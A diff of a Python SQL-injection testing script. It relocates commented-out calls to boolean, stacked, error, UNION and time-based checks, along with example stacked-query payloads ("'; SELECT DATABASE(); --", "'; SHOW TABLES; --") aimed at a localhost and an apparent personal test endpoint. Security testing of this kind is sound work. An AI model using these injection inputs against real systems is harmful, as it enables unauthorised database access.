@@ -2,7 +2,6 @@
 import os
 import sys
 import urllib2
-import httplib
 import json as js
 import time
 import requests
@@ -95,25 +94,13 @@ def check_time_based_attack(url):
             print "The response time after boolean attack SLEEP(15) is: " + str(duration) + "\n"
 
 
-online = "https://my-securitytest.herokuapp.com/getFriend/user1"
-local = "http://localhost:3000/getFriend/user1"
-
-# check_boolean_based_attack(local)
-# check_stack_query(online)
-# check__error_based_attack(online)
-# check_union_query_based_attack(online)
-# check_time_based_attack(online)
-
-# localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
-# localhost:3000/getFriend/user1'; SHOW TABLES; --%20
-
 def help_info():
     usage = 'Usage: python experiment.py [URL] [-Option]'
     helper = "'-b': check_boolean_based_attack\n" \
-           "'-s': check_stack_query\n" \
-           "'-e': check__error_based_attack\n" \
-           "'-u': check_union_query_based_attack\n" \
-           "'-t': check_time_based_attack\n"
+        "'-s': check_stack_query\n" \
+        "'-e': check__error_based_attack\n" \
+        "'-u': check_union_query_based_attack\n" \
+        "'-t': check_time_based_attack\n"
     print usage + '\n' + helper
 
 
@@ -126,8 +113,6 @@ commands = {
 }
 
 
-
-
 if __name__ == '__main__':
     if len(sys.argv) < 3:
         if sys.argv[1] == '-h':
@@ -138,3 +123,16 @@ if __name__ == '__main__':
         command = os.path.basename(sys.argv[1])
         if command in commands:
             commands[command](sys.argv[2])
+            
+
+# online = "https://my-securitytest.herokuapp.com/getFriend/user1"
+# local = "http://localhost:3000/getFriend/user1"
+# check_boolean_based_attack(local)
+# check_stack_query(online)
+# check__error_based_attack(online)
+# check_union_query_based_attack(online)
+# check_time_based_attack(online)
+
+# localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
+# localhost:3000/getFriend/user1'; SHOW TABLES; --%20
+
